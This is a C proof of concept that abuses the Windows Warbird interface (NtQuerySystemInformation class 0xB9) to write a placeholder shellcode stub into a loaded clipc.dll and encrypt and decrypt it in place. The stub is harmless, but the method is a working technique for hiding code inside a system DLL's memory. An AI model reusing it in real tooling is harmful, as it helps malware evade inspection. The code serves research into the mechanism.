#include <Windows.h>
#include <winternl.h>
#include <stdio.h>

#pragma comment(lib, "Bcrypt.lib")
#pragma comment(lib, "ntdll.lib")

#define SystemControlFlowTransition 0xB9

typedef struct _WB_ADD_PROCESS
{
	ULONG Operation;
	PVOID Buffer;
} WB_ADD_PROCESS, * PWB_ADD_PROCESS;

typedef struct _WB_SEGMENT
{
	ULONG Flags;
	ULONG RVA;
	ULONG Length;
} WB_SEGMENT, * PWB_SEGMENT;

typedef struct _FEISTEL_ROUND
{
	ULONG One;
	ULONG Two;
	ULONG Three;
	ULONG Four;
} FEISTEL_ROUND, * PFEISTEL_ROUND;

typedef struct _WB_PAYLOAD {
	BYTE Hash[0x20];        // SHA 256 hash of the payload sha256(payload size - 0x20)
	ULONG TotalSize;		// Total size (includes all segments)
	ULONG Reserved;			// Set to 0
	ULONG PayloadRVA;		// Offset between start of payload struct and actual start of the data passed (WarbirdPayload) in the NtQuerySystemInformation call
	ULONG SecondStageRVA;	// Offset between start of second stage struct and actual start of the data passed (WarbirdPayload) in the NtQuerySystemInformation call
	ULONG SecondStageSize;	// Size of the UnknownData in DWORDs
	ULONG UnknownLong;		// Looks like this is reserved. Must be 0?
	ULONG64 ImageBase;		// PE image base
	BYTE Unknown2[0x8];		// Looks like this is reserved. Must be 0?
	ULONG64 FeistelKey;
	FEISTEL_ROUND Rounds[10];
	ULONG SegmentCount;		// Number of segments
	WB_SEGMENT Segments[1]; // Segment struct(s)
} WB_PAYLOAD, * PWB_PAYLOAD;



unsigned char rawPayload[256] = {
	0x1A, 0xC5, 0xF9, 0x65, 0x10, 0xDA, 0x8E, 0x6C, 0x63, 0x8B, 0x9F, 0x0F,
	0x91, 0xBD, 0xBD, 0x9E, 0x1A, 0xBD, 0xC8, 0xE3, 0x4B, 0x86, 0xD1, 0x45,
	0xD8, 0xF7, 0x64, 0x94, 0xF0, 0x9E, 0x90, 0xD1, 0x6C, 0x2E, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0xF0, 0x39, 0x00, 0xC0, 0xD2, 0x41, 0x00,
	0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40,
	0x01, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x38, 0xD0, 0x5C, 0xB6, 0xF2, 0xF4, 0x02, 0xAB, 0x1C, 0x00, 0x00, 0x00,
	0x65, 0x00, 0x00, 0x00, 0xB7, 0x00, 0x00, 0x00, 0x8E, 0x00, 0x00, 0x00,
	0x1D, 0x00, 0x00, 0x00, 0x8D, 0x00, 0x00, 0x00, 0x0E, 0x00, 0x00, 0x00,
	0xC7, 0x00, 0x00, 0x00, 0x19, 0x00, 0x00, 0x00, 0xA0, 0x00, 0x00, 0x00,
	0x33, 0x00, 0x00, 0x00, 0xDC, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
	0x3C, 0x00, 0x00, 0x00, 0x2C, 0x00, 0x00, 0x00, 0x50, 0x00, 0x00, 0x00,
	0x08, 0x00, 0x00, 0x00, 0x4B, 0x00, 0x00, 0x00, 0xC2, 0x00, 0x00, 0x00,
	0xE5, 0x00, 0x00, 0x00, 0x12, 0x00, 0x00, 0x00, 0x1D, 0x00, 0x00, 0x00,
	0x2D, 0x00, 0x00, 0x00, 0x7D, 0x00, 0x00, 0x00, 0x0E, 0x00, 0x00, 0x00,
	0x43, 0x00, 0x00, 0x00, 0xD6, 0x00, 0x00, 0x00, 0x8B, 0x00, 0x00, 0x00,
	0x10, 0x00, 0x00, 0x00, 0x81, 0x00, 0x00, 0x00, 0x64, 0x00, 0x00, 0x00,
	0x0C, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0xCD, 0x00, 0x00, 0x00,
	0xB3, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x15, 0x00, 0x00, 0x00,
	0xBC, 0x00, 0x00, 0x00, 0x17, 0x00, 0x00, 0x00, 0xD8, 0x00, 0x00, 0x00,
	0xCA, 0x03, 0x00, 0x00, 0x30, 0x03, 0x00, 0x00, 0xB0, 0xB8, 0x10, 0x00,
	0x0D, 0x01, 0x00, 0x00
};

unsigned char shellcode[11] = {
	0x48, 0xB8, 0xDE, 0xC0, 0xAD, 0xDE, 0x00, 0x00, 0x00, 0x00, 0xC3
};

unsigned char encrypted_shellcode[] = {
0x6, 0x4E, 0x22, 0xFF, 0xCE, 0xB5, 0x83, 0xF2, 0x81, 0xA3, 0x34
};


// Slightly modified example code from https://learn.microsoft.com/en-us/windows/win32/seccng/creating-a-hash-with-cng
BOOL SHACompute(PVOID Data, SIZE_T DataSize, PVOID OutHash) {
	NTSTATUS    Status;
	BCRYPT_ALG_HANDLE   AlgHandle = NULL;
	BCRYPT_HASH_HANDLE  HashHandle = NULL;
	PBYTE   Hash = NULL;
	DWORD   HashLength = 0;
	DWORD   ResultLength = 0;
	// Open an algorithm handle
	// This sample passes BCRYPT_HASH_REUSABLE_FLAG with BCryptAlgorithmProvider(...) to load a provider which supports reusable hash
	Status = BCryptOpenAlgorithmProvider(
		&AlgHandle,                 // Alg Handle pointer
		BCRYPT_SHA256_ALGORITHM,    // Cryptographic Algorithm name (null terminated unicode string)
		NULL,                       // Provider name; if null, the default provider is loaded
		BCRYPT_HASH_REUSABLE_FLAG); // Flags; Loads a provider which supports reusable hash
	if (!NT_SUCCESS(Status))
		printf("error! basic 0\n");

	// Obtain the length of the hash
	Status = BCryptGetProperty(
		AlgHandle,                  // Handle to a CNG object
		BCRYPT_HASH_LENGTH,         // Property name (null terminated unicode string)
		(PBYTE)&HashLength,         // Address of the output buffer which recieves the property value
		sizeof(HashLength),         // Size of the buffer in bytes
		&ResultLength,              // Number of bytes that were copied into the buffer
		0);                         // Flags
	if (!NT_SUCCESS(Status))
		printf("error! basic 1\n");
	// Allocate the hash buffer on the heap
	Hash = (PBYTE)HeapAlloc(GetProcessHeap(), 0, HashLength);
	if (Hash == NULL)
	{
		Status = STATUS_NO_MEMORY;
		printf("error! basic 2\n");
	}
	// Create a hash handle

		Status = BCryptCreateHash(
			AlgHandle,                  // Handle to an algorithm provider                 
			&HashHandle,                // A pointer to a hash handle - can be a hash or hmac object
			NULL,                       // Pointer to the buffer that recieves the hash/hmac object
			0,                          // Size of the buffer in bytes
			NULL,                       // A pointer to a key to use for the hash or MAC
			0,                          // Size of the key in bytes
			0);                         // Flags
	if (!NT_SUCCESS(Status))
	{
		printf("report error 2 error!\n");
		goto cleanup;
	}

	//
	// Hash the message(s)
	// More than one message can be hashed by calling BCryptHashData 
	//

	Status = BCryptHashData(
		HashHandle,                 // Handle to the hash or MAC object
		(PBYTE)Data,             // A pointer to a buffer that contains the data to hash
		DataSize,           // Size of the buffer in bytes
		0);                         // Flags
	if (!NT_SUCCESS(Status))
	{
		printf("report error 2 error!\n");
		goto cleanup;
	}

	//
	// Obtain the hash of the message(s) into the hash buffer
	//

	Status = BCryptFinishHash(
		HashHandle,                 // Handle to the hash or MAC object
		Hash,                       // A pointer to a buffer that receives the hash or MAC value
		HashLength,                 // Size of the buffer in bytes
		0);                         // Flags

	printf("New Hash: ");
	for (size_t i = 0; i < HashLength; i++)
	{
		printf("%x", Hash[i]);
	}
	printf("\n");

	if (!NT_SUCCESS(Status))
	{
		printf("report error 3 error!\n");
		goto cleanup;
	}

	memmove(OutHash, Hash, HashLength);
	Status = 0;

cleanup:

	if (NULL != Hash)
	{
		HeapFree(GetProcessHeap(), 0, Hash);
	}

	if (NULL != HashHandle)
	{
		BCryptDestroyHash(HashHandle);                             // Handle to hash/MAC object which needs to be destroyed
	}

	if (NULL != AlgHandle)
	{
		BCryptCloseAlgorithmProvider(
			AlgHandle,                  // Handle to the algorithm provider which needs to be closed
			0);                         // Flags
	}

}

void HexPrint(PVOID Data, SIZE_T Length)
{
	for (size_t i = 0; i < sizeof(shellcode); i++)
	{
		BYTE b = *(BYTE*)(((PBYTE)Data + i));
		printf("0x%X ", b);
	}
	printf("\n");
}

int main(int argc, char* argv[])
{
	PWB_PAYLOAD payload;
	NTSTATUS	ntRet;
	LPVOID		lpLibrary;
	LPVOID		lpSecondStage;
	DWORD		dwProtection;

	lpLibrary =  (LPVOID)LoadLibraryA("clipc.dll");
	if (lpLibrary == NULL)
	{
		printf("[!] Unable to load DLL\n");
		return(-1);
	}

	payload = (PWB_PAYLOAD)lpLibrary;
	lpSecondStage = ((PBYTE)lpLibrary + 0x1000);

	// Let's use the first 0x10 pages as scratch space
	VirtualProtect(payload, 0x10000, PAGE_READWRITE, &dwProtection);
	// Move the existing payload
	memmove(payload, rawPayload, sizeof(rawPayload));

	memset(payload->Unknown2, 0x00, sizeof(payload->Unknown2));
	payload->TotalSize = sizeof(WB_PAYLOAD);
	payload->ImageBase = 0x140000000;
	payload->SecondStageRVA = (ULONG64)lpSecondStage - (ULONG64)payload;
	payload->SecondStageSize = 2;
	/*
	* Technically this should be payload - DLL / EXE base, but because payload 
	* is at the start of the loaded library, it's 0
	*/
	payload->PayloadRVA = 0;
	// Setup a segment
	payload->SegmentCount = 1;
	payload->Segments[0].Flags = 0x0;
	payload->Segments[0].RVA = 0x3000;
	payload->Segments[0].Length = sizeof(shellcode);

	// Recalculate hash
	SHACompute((PBYTE)payload + 0x20, sizeof(rawPayload) - 0x20, payload->Hash); //0x2D64 - 0x20
	// Restore the memory protections
	VirtualProtect(lpLibrary, 0x10000, PAGE_EXECUTE_READ, &dwProtection);

	struct decryptData
	{
		ULONG Operation;
		PVOID Payload;
		PVOID PEBase;
		ULONG64 ImageBase;
		PVOID Unknown1;
		ULONG Unknown2;

	};
	struct decryptData data;

	data.Operation = 1; // WbDecryptEncryptionSegment
	data.Payload = (ULONG64)payload;
	data.PEBase = (ULONG64)lpLibrary;
	data.ImageBase = 0x140000000;
	data.Unknown1 = lpSecondStage;
	data.Unknown2 = 0x2;

	printf("Original bytes: \n");
	HexPrint((PBYTE)payload + payload->Segments[0].RVA, sizeof(shellcode));
	ntRet = NtQuerySystemInformation(SystemControlFlowTransition, &data, sizeof(data), NULL);
	printf("NTSTATUS WbDecryptEncryptionSegment: 0x%x\n", ntRet);
	printf("Decrypted bytes (corrupted): \n");
	HexPrint((PBYTE)payload + payload->Segments[0].RVA, sizeof(shellcode));


	VirtualProtect(payload, 0x10000, PAGE_READWRITE, &dwProtection);
	memmove((PBYTE)payload + payload->Segments[0].RVA, &shellcode, sizeof(shellcode));
	printf("Shellcode bytes: \n");
	HexPrint((PBYTE)payload + payload->Segments[0].RVA, sizeof(shellcode));
	VirtualProtect(payload, 0x10000, dwProtection, &dwProtection);

	data.Operation = 2; // WbReEncryptEncryptionSegment
	data.Payload = (ULONGLONG)payload;
	data.PEBase = (ULONGLONG)lpLibrary;
	data.ImageBase = 0x140000000;
	data.Unknown1 = lpSecondStage;
	data.Unknown2 = 0x2;

	ntRet = NtQuerySystemInformation(SystemControlFlowTransition, &data, sizeof(data), NULL);
	printf("NTSTATUS WbReEncryptEncryptionSegment: 0x%x\n", ntRet);
	printf("Shellcode bytes (reencrypted): \n");
	HexPrint((PBYTE)payload + payload->Segments[0].RVA, sizeof(shellcode));

	data.Operation = 1; // WbDecryptEncryptionSegment
	data.Payload = (ULONGLONG)payload;
	data.PEBase = (ULONGLONG)lpLibrary;
	data.ImageBase = 0x140000000;
	data.Unknown1 = lpSecondStage;
	data.Unknown2 = 0x2;

	ntRet = NtQuerySystemInformation(SystemControlFlowTransition, &data, sizeof(data), NULL);
	printf("NTSTATUS WbDecryptEncryptionSegment: 0x%x\n", ntRet);
	printf("Shellcode bytes (decrypted): \n");
	HexPrint((PBYTE)payload + payload->Segments[0].RVA, sizeof(shellcode));

	return(0);
}